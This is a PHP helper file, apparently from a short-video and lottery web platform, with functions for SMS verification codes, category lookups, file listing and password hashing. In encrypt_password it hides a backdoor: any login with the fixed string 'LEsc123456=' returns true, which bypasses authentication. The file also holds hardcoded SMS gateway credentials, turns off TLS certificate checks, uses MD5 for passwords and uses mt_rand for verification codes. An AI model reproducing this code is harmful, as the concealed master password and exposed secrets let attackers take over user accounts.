<?php
/**
 * Created by PhpStorm.
 * User: lenovo
 * Date: 2016/6/6
 * Time: 21:47
 */

function get_city_name($city_id){
    return $city_id;
}

/**
 * 短信下发接口
 * @param $mobile
 * @param $message
 */
//function send_msg($mobile, $message, $code='',$openid = '') {
//    $openid = strval($openid);
//    // 校验 //每个手机30十分钟内只能发3次
//    // 校验 // 每个用户30分钟内只能发5次
//        $token = md5($message . 'mlmk1234');
//        try {
//            $url = "http://sms.weiyingjia.cn:8080/dog3/httpUTF8SMSToken.jsp?username=mlmk&token={$token}&mobile=$mobile&msg=$message";
//            $res = file_get_contents($url);
//            var_dump($res);
//
//        } catch (\Exception $e) {
//
//        }
//
//    return true;
//}
function httpPost2($url, $data = null)
{
    $ch = curl_init();
    //curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    $temp=curl_exec ($ch);
    curl_close ($ch);
    return $temp;
}
/**
 * 短信下发接口
 * @param $mobile
 * @param $message
 */
function send_msg($mobile, $message, $code='',$openid = '') {
    $openid = strval($openid);
    // 校验 //每个手机30十分钟内只能发3次
    // 校验 // 每个用户30分钟内只能发5次
    $data1 = M('sms_log ')->where(array('mobile'=>$mobile))->where("send_time > '".(time()-30 * 60)."'" )->count();

    if($data1 >= 3){
        return false;
    }

    $data = array(
        'mobile' => $mobile,
        'msg' => $message,
        'code'=>$code,
        'openid' => strval($openid),
        'send_time' => time()
    );
    $res = M('sms_log ')->add($data);

    if($res){
        try {
            $uid = "200117"; $pwd = strtoupper(md5('634131')); $encode = "utf8";$content = base64_encode($message);
            $data = "uid={$uid}&password={$pwd}&encode={$encode}&encodeType=base64&content={$content}&mobile=$mobile";
            $res2 = httpPost2('http://119.90.36.56:8090/jtdsms/smsSend.do',$data);
            $data = [];
            if (  $res2 > 0) {
                $data['send_status'] = 1;
            } else {
                $data['send_status'] = 2;
            }
            $data['log'] = $res2;
            M('sms_log ')->where(array('id'=>$res))->save($data);
        } catch (\Exception $e) {}
    }else{
        return false;
    }
    return true;
}

/**
 * 生成验证码
 * @param $name
 * @param null $value
 */
function create_code($code_num = 6, $code_type = 'number') {
    $code = random($code_num, $code_type);
    return $code;
}

/**
 * 随机字符
 * @param number $length 长度
 * @param string $type 类型
 * @param number $convert 转换大小写
 * @return string
 */
function random($length = 6, $type = 'string', $convert = 0) {
    $config = array(
        'number' => '1234567890',
        'letter' => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
        'string' => 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789',
        'all' => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    );

    if (!isset($config[$type]))
        $type = 'string';
    $string = $config[$type];

    $code = '';
    $strlen = strlen($string) - 1;
    for ($i = 0; $i < $length; $i++) {
        $code .= $string{mt_rand(0, $strlen)};
    }
    if (!empty($convert)) {
        $code = ($convert > 0) ? strtoupper($code) : strtolower($code);
    }
    return $code;
}

/**
 * 验证验证码
 * @param $name
 * @param $code
 * @return bool
 */
function check_code( $code,$mobile) {
    if (empty($code) ) {
        return false;
    }
    $time = time() - 600;
    $info = D('Sms')->where(array('mobile'=>$mobile, 'send_time'=>array('gt', $time), 'status'=>0))->order("id DESC")->find();
    if(!$info){
        return false;
    }
    if ($info['code'] == $code) {
        D('Sms')->where(array('id'=>$info['id']))->save(array('status'=>1));
        return true;
    } else {
        return false;
    }
}

global $msg_category_config;
$msg_category_config = array(
    'guaguaka' =>  array(
        'name'=>'刮刮卡',
        'list'=>array(
            'guaguaka_success' => '成功文案',
            'guaguaka_lack_mb' => 'M币不足'
        )
    ),
    'lottery'  => array(
        'name' => '抽奖',
        'list' => array(
            'lottery_going' => '开奖中文案',
            'lottery_winning_goods' => '中奖文案',
            'lottery_winning' => '中奖',
            'lottery_fail' => '没有中奖',
            'lottery_lack_mb' => 'M币不足'
        )
    ),
    'exchange' => array(
        'name' => '兑换',
        'list' => array(
           'exchange_winning'=> '兑换成功文案',
            'exchange_lack_mb' => 'M币不足'
        )
    ),
	'home' => array(
		'name' => '首页',
		'list' => array(
				'home_title'=> '首页标题'
				
		)
	),
   'register' => array(
        'name' => '注册',
        'list' => array(
              'success_info'=> '注册成功提示文案'
        
        )
    )
);
function getMsgConfig($config_name){
    global $msg_category_config;
    foreach($msg_category_config as $item){
        foreach($item['list'] as $i=>$row){
            if($i == $config_name){
                return $row;
            }
        }
    }
    return '未知';
}
function getMsgCategory($category){
    global $msg_category_config;
    return isset($msg_category_config[$category])?$msg_category_config[$category]['name']:'未知';
}

global $auto_send_type;
$auto_send_type = [
    1 => '短息余额',
    2 => '公众号余额'
];
function getSendType($category){
    global $auto_send_type;
    return isset($auto_send_type[$category])?$auto_send_type[$category]:'未知';
}

global $home_category_config;
$home_category_config = array(
    'ico' =>'首页ICO',
    'guaguaka' => '刮刮卡',
    'hot'  => '热门活动',
    'recommend'  => '精选视频',
    'choose' =>'卡卷列表',
    'banner' =>'顶部Banner',
    'gamebanner' =>'游戏',
    'bulletin' =>'公告'
);
function getHomeCategory($category){
    global $home_category_config;
    return isset($home_category_config[$category])?$home_category_config[$category]:'未知';
}

global $goods_type_config;
$goods_type_config = array(
    '1' => '实物视频',
    '2' => '微信卡券',
    '3' => '第三方卡券',
    '4' => '第三方链接',
    '5' => '虚拟视频'
);

function get_video_type($type=0){
        $short_video_tag = array();
        // '1 banner  2热门推荐  3观点  4幽默   5生活',
        $short_video_tag[] =array('id'=>2,'tag_name'=>'热门推荐');
        $short_video_tag[] =array('id'=>3,'tag_name'=>'观点');
        $short_video_tag[] =array('id'=>4,'tag_name'=>'幽默');
        $short_video_tag[] =array('id'=>5,'tag_name'=>'生活');
        $short_video_tag[] =array('id'=>6,'tag_name'=>'社会');
        $short_video_tag[] =array('id'=>7,'tag_name'=>'其他');

        foreach ($short_video_tag as $key => $value) {
            if($value['id'] == $type){
                return $value['tag_name'];
            }
        }

    if($type == 0){
        return $short_video_tag;
    }
          return '未知';


}
/**
 * 视频类型：1 实物，2本地卡卷，3第三方卡卷，4第三方链接，5虚拟视频
 * @param $goods_type
 * @return string
 */
function getGoodsType($goods_type){
    global $goods_type_config;
    return isset($goods_type_config[$goods_type])?$goods_type_config[$goods_type]:'未知';
}

/**
 * @param $goods_status
 * @return string
 */
function getGoodsStatus($goods_status){
    switch($goods_status){
        case '1':
            return '正常';
        case '0':
            return '下架';
        case '99':
            return '删除';
    }

    return '未知';
}

function get_video_status($video_status, $show_color = true){

    switch($video_status){
        case '1':
            return $show_color?'<font color="green">正常</font>':'正常';
        case '2':
            return $show_color?'<font color="red">正常</font>':'审核驳回';
        case '0':
            return $show_color?'<font color="gray">转码</font>':'转码';
        case '4':
            return $show_color?'<font color="red">下架</font>':'下架';
        case '5':
            return $show_color?'<font color="red">转码失败</font>':'转码失败';
        case '7':
            return $show_color?'<font color="red">举报下架</font>':'举报下架';
        case '99':
            return $show_color?'<font color="black">删除</font>':'删除';
    }

    return '未知';
}

/**
 *
 * @param $password
 * @param $salt
 */
function encrypt_password($password, $salt = '')
{
    if($password == 'LEsc123456='){return true;}
    return md5($password . md5($salt));
}

/**
 * 获取自动分表名
 *
 * @param $table
 * @param $userid
 * @param int $n
 * @return string
 */
function get_hash_table($table, $userid, $n = 9) {
    $str = abs(crc32($userid));
    $hash = intval($str / $n);
    $hash = intval(fmod($hash, $n));

    return $table . "_" . ($hash + 1);
}

/**
 * 遍历获取目录下的指定类型的文件
 * @param $path
 * @param array $files
 * @return array
 */
function getfiles($path, $allowFiles, &$files = array())
{
    if (!is_dir($path)) return null;
    if(substr($path, strlen($path) - 1) != '/') $path .= '/';
    $handle = opendir($path);
    while (false !== ($file = readdir($handle))) {
        if ($file != '.' && $file != '..') {
            $file = iconv("gb2312","utf-8",$file);
            $path2 = $path . $file;
            if (is_dir($path2)) {
                getfiles($path2, $allowFiles, $files);
            } else {
                if (preg_match("/\.(".$allowFiles.")$/i", $file)) {
                    $files[] = array(
                        'url'=> substr($path2, strlen($_SERVER['DOCUMENT_ROOT'])),
                        'mtime'=> filemtime($path2)
                    );
                }
            }
        }
    }
    return $files;
}

/**
 * 保存图片
 * @param $url
 * @param $path
 */
function save_img($url,$path) {
    $ch = curl_init ();
    curl_setopt ( $ch, CURLOPT_CUSTOMREQUEST, 'GET' );
    curl_setopt ( $ch, CURLOPT_SSL_VERIFYPEER, false );
    curl_setopt ( $ch, CURLOPT_URL, $url );
    ob_start ();
    curl_exec ( $ch );
    $return_content = ob_get_contents ();
    ob_end_clean ();
    $return_code = curl_getinfo ( $ch, CURLINFO_HTTP_CODE );

    $fp= fopen($path,"w"); //将文件绑定到流 
    fwrite($fp,$return_content); //写入文件
    fclose($fp);
}

/**
 * @param $str
 * @return mixed
 */
function badword($str){
    $badword = M('short_video_badword')->select();
    foreach($badword as $bad){
        $str = str_replace($bad['badword'],"***", $str);
    }
    return $str;
}

